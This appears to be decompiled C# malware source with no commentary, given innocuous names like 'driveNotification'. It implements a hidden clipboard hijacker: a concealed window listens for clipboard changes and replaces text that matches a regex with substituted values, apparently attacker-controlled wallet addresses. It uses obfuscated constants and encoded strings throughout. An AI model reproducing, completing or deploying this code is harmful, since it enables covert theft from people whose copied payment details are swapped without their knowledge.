using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace ConsoleApplication7;

public sealed class driveNotification
{
	public class NotificationForm : Form
	{
		private static string currentClipboard = GetText();

		protected unsafe override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = ((Form)this).get_CreateParams();
				createParams.set_ExStyle(createParams.get_ExStyle() | (124 + sizeof(float)));
				return createParams;
			}
		}

		public NotificationForm()
		{
			Program.NativeMethods.SetParent(((Control)this).get_Handle(), Program.NativeMethods.intpreclp);
			Program.NativeMethods.AddClipboardFormatListener(((Control)this).get_Handle());
		}

		private unsafe bool RegexResult(Regex pattern)
		{
			if (pattern.Match(currentClipboard).Success)
			{
				return (byte)(-3 + sizeof(float)) != 0;
			}
			return (byte)(-4 + sizeof(float)) != 0;
		}

		protected unsafe override void WndProc(ref Message m)
		{
			if (((Message)(ref m)).get_Msg() == 793 + sizeof(float))
			{
				currentClipboard = GetText();
				if (currentClipboard.StartsWith(_003CModule_003E.SERT("\uef10\uef11\uef43", 321843054 + sizeof(float))))
				{
					if (RegexResult(Program.appMutexRegex) && !currentClipboard.Contains(Program.appMutex))
					{
						string text = Program.appMutexRegex.Replace(currentClipboard, Program.appMutex);
						SetText(text);
					}
				}
				else if (RegexResult(Program.appMutexRegex) && !currentClipboard.Contains(Program.appMutex2))
				{
					string text2 = Program.appMutexRegex.Replace(currentClipboard, Program.appMutex2);
					SetText(text2);
				}
			}
			((Form)this).WndProc(ref m);
		}

		public unsafe static string GetText()
		{
			string ReturnValue = string.Empty;
			Thread thread = new Thread((ThreadStart)delegate
			{
				ReturnValue = Clipboard.GetText();
			});
			thread.SetApartmentState((ApartmentState)(-4 + sizeof(float)));
			thread.Start();
			thread.Join();
			return ReturnValue;
		}

		public unsafe static void SetText(string txt)
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				Clipboard.SetText(txt);
			});
			thread.SetApartmentState((ApartmentState)(-4 + sizeof(float)));
			thread.Start();
			thread.Join();
		}
	}
}
